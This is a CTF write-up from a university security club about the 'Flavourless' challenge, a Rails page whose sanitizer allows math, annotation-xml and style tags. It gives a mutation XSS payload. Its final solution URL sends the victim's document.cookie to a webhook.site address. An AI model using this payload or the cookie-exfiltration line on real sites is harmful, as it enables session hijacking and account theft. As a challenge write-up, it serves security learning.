<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Flavourless</title><meta content=Flavourless name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/flavourless/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content=Flavourless property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/flavourless/ property=twitter:url><meta content=Flavourless property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/bi0sCTF-2025/flavourless/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>flavourless</span></div><time datetime=2025-07-06>Published on: <span class=accent-data>2025-07-06</span></time><address rel=author>By <span class=accent-data> Abizer Lokhandwala, and exploiitm </span></address><h1>Flavourless</h1><hr><h3 id=premise>Premise</h3><p>This is a very simple page. It shows our input with some sanitization, but it allows <code>&LTmath></code>, <code>&LTannotation-xml></code>, and <code>&LTstyle></code> tags.<pre class=language-ruby data-lang=ruby style=background:#282828;color:#fdf4c1aa><code class=language-ruby data-lang=ruby><span style=color:#fa5c4b>class </span><span style=color:#8ec07c>FlavourController </span><span>< </span><span style=color:#8ec07c>ApplicationController
</span><span>  </span><span style=color:#fa5c4b>include </span><span style=color:#8ec07c>ActionView</span><span>::</span><span style=color:#8ec07c>Helpers</span><span>::SanitizeHelper
</span><span>  </span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>index
</span><span>    user_input </span><span style=color:#fe8019>=</span><span> params[</span><span style=color:#fdf4c1>:input</span><span>]
</span><span>
</span><span>    </span><span style=color:#fdf4c1>@sanitized_input </span><span style=color:#fe8019>=</span><span> sanitize(user_input, </span><span style=color:#fdf4c1>tags: </span><span>[ </span><span style=color:#b8bb26>"math"</span><span>, </span><span style=color:#b8bb26>"annotation-xml"</span><span>, </span><span style=color:#b8bb26>"style" </span><span>])
</span><span>  </span><span style=color:#fa5c4b>end
</span><span style=color:#fa5c4b>end
</span></code></pre><hr><pre class=language-html data-lang=html style=background:#282828;color:#fdf4c1aa><code class=language-html data-lang=html><span style=color:#83a598>&LT!</span><span style=color:#fa5c4b>DOCTYPE </span><span style=color:#d3869b>html</span><span style=color:#83a598>>
</span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>html </span><span style=color:#8ec07c>lang=</span><span style=color:#b8bb26>"en"</span><span style=color:#83a598>>
</span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>head</span><span style=color:#83a598>>
</span><span>  </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>meta </span><span style=color:#8ec07c>charset=</span><span style=color:#b8bb26>"UTF-8"</span><span style=color:#83a598>>
</span><span>  </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>meta </span><span style=color:#8ec07c>name=</span><span style=color:#b8bb26>"viewport" </span><span style=color:#8ec07c>content=</span><span style=color:#b8bb26>"width=device-width, initial-scale=1.0"</span><span style=color:#83a598>>
</span><span>  </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>title</span><span style=color:#83a598>></span><span>Flavour Rater</span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>title</span><span style=color:#83a598>>
</span><span>  </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>script </span><span style=color:#8ec07c>src=</span><span style=color:#b8bb26>"https://cdn.tailwindcss.com"</span><span style=color:#83a598>>&LT/</span><span style=font-weight:700;color:#8ec07c>script</span><span style=color:#83a598>>
</span><span>  </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>style</span><span style=color:#83a598>>
</span><span>    </span><span style=font-weight:700;color:#fa5c4b>body </span><span style=color:#fdf4c1>{
</span><span style=color:#fdf4c1>      </span><span style=color:#8ec07c>background</span><span style=color:#fdf4c1>: </span><span style=color:#fabd2f>linear-gradient</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>135</span><span style=color:#d3869b>deg</span><span style=color:#fdf4c1>, </span><span style=color:#83a598>#1a1a1a </span><span style=color:#fabd2f>0</span><span style=color:#d3869b>%</span><span style=color:#fdf4c1>, </span><span style=color:#83a598>#2b2b2b </span><span style=color:#fabd2f>100</span><span style=color:#d3869b>%</span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>      </span><span style=color:#8ec07c>min-height</span><span style=color:#fdf4c1>: </span><span style=color:#fabd2f>100</span><span style=color:#d3869b>vh</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>      </span><span style=color:#8ec07c>font-family</span><span style=color:#fdf4c1>: </span><span style=color:#b8bb26>'Inter'</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>sans-serif</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>      </span><span style=color:#8ec07c>color</span><span style=color:#fdf4c1>: </span><span style=color:#83a598>#ffffff</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>    }
</span><span style=color:#fdf4c1>    </span><span style=color:#b8bb26>.glow-text </span><span style=color:#fdf4c1>{
</span><span style=color:#fdf4c1>      </span><span style=color:#8ec07c>text-shadow</span><span style=color:#fdf4c1>: </span><span style=color:#fabd2f>0 0 10</span><span style=color:#d3869b>px </span><span style=color:#fabd2f>rgba</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>255</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>135</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>0</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>0.7</span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>    }
</span><span style=color:#fdf4c1>    </span><span style=color:#b8bb26>.custom-container </span><span style=color:#fdf4c1>{
</span><span style=color:#fdf4c1>      </span><span style=color:#8ec07c>background</span><span style=color:#fdf4c1>: </span><span style=color:#fabd2f>rgba</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>255</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>255</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>255</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>0.05</span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>      backdrop-</span><span style=color:#8ec07c>filter</span><span style=color:#fdf4c1>: </span><span style=color:#fabd2f>blur</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>10</span><span style=color:#d3869b>px</span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>      </span><span style=color:#8ec07c>border</span><span style=color:#fdf4c1>: </span><span style=color:#fabd2f>1</span><span style=color:#d3869b>px </span><span style=color:#fabd2f>solid rgba</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>255</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>135</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>0</span><span style=color:#fdf4c1>, </span><span style=color:#fabd2f>0.3</span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>    }
</span><span style=color:#fdf4c1>    </span><span style=color:#b8bb26>.code-block </span><span style=color:#fdf4c1>{
</span><span style=color:#fdf4c1>      </span><span style=color:#8ec07c>background</span><span style=color:#fdf4c1>: </span><span style=color:#83a598>#2d2d2d</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>      </span><span style=color:#8ec07c>padding</span><span style=color:#fdf4c1>: </span><span style=color:#fabd2f>0.25</span><span style=color:#d3869b>rem </span><span style=color:#fabd2f>0.5</span><span style=color:#d3869b>rem</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>      </span><span style=color:#8ec07c>border-radius</span><span style=color:#fdf4c1>: </span><span style=color:#fabd2f>0.25</span><span style=color:#d3869b>rem</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>    }
</span><span style=color:#fdf4c1>  </span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>style</span><span style=color:#83a598>>
</span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>head</span><span style=color:#83a598>>
</span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>body </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"flex items-center justify-center p-4"</span><span style=color:#83a598>>
</span><span>  </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>div </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"custom-container rounded-2xl shadow-2xl p-8 max-w-2xl w-full"</span><span style=color:#83a598>>
</span><span>    </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>h1 </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"text-4xl font-bold text-orange-500 glow-text text-center mb-6"</span><span style=color:#83a598>></span><span>Flavour Less ;)</span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>h1</span><span style=color:#83a598>>
</span><span>
</span><span>    <% if @sanitized_input.present? %>
</span><span>      </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>p </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"font-semibold text-orange-400 mb-2"</span><span style=color:#83a598>></span><span>Sanitized Output:</span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>p</span><span style=color:#83a598>>
</span><span>      </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>div </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"p-4 bg-gray-900 rounded-lg text-white"</span><span style=color:#83a598>>
</span><span>        <%= raw @sanitized_input %>
</span><span>      </span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>div</span><span style=color:#83a598>>
</span><span>    <% else %>
</span><span>      </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>p </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"text-gray-300"</span><span style=color:#83a598>></span><span>No input provided. Please add a query parameter, e.g., </span><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>code </span><span style=color:#8ec07c>class=</span><span style=color:#b8bb26>"code-block"</span><span style=color:#83a598>></span><span>?input=...</span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>code</span><span style=color:#83a598>></span><span>.</span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>p</span><span style=color:#83a598>>
</span><span>    <% end %>
</span><span>  </span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>div</span><span style=color:#83a598>>
</span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>body</span><span style=color:#83a598>>
</span><span style=color:#83a598>&LT/</span><span style=font-weight:700;color:#8ec07c>html</span><span style=color:#83a598>>
</span></code></pre><hr><h3 id=analysis>Analysis</h3><p>This was a simple <strong>mutation XSS</strong> question.<br> We can just try some default methods and payloads.<p>Basically:<pre class=language-html data-lang=html style=background:#282828;color:#fdf4c1aa><code class=language-html data-lang=html><span style=color:#83a598><</span><span style=font-weight:700;color:#8ec07c>math</span><span style=color:#83a598>><</span><span style=font-weight:700;color:#8ec07c>annotation-xml </span><span style=color:#8ec07c>encoding=</span><span style=color:#b8bb26>"text/html"</span><span style=color:#83a598>><</span><span style=font-weight:700;color:#8ec07c>style</span><span style=color:#83a598>></span><span style=color:#fdf4c1><</span><span style=font-weight:700;color:#fa5c4b>img</span><span style=color:#b8bb26> src onerror=alert(origin</span><span style=color:#fdf4c1>)>
</span></code></pre><p>will confuse the browser on what is and isnâ€™t code to be executed, and will <strong>execute the <code>onerror</code> part</strong>. This is called <strong>mutation injection</strong>.<hr><h3 id=final-solution>Final Solution</h3><pre style=background:#282828;color:#fdf4c1aa><code><span>http://localhost:3000/report?url=http%3A%2F%2Flocalhost%3A3000%2F%3Finput%3D%253Cmath%253E%253Cannotation-xml%2520encoding%3D%2522text%2Fhtml%2522%253E%253Cstyle%253E%253Cimg%2520src%2520onerror%3D%2522window.location.href%3D%2527https%3A%2F%2Fwebhook.site%2F966f7699-02fe-4b89-ab1c-86aae18d86d6%3Fcookie%3D%2527%252BencodeURIComponent%28document.cookie%29%3B%2522%253E
</span></code></pre><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>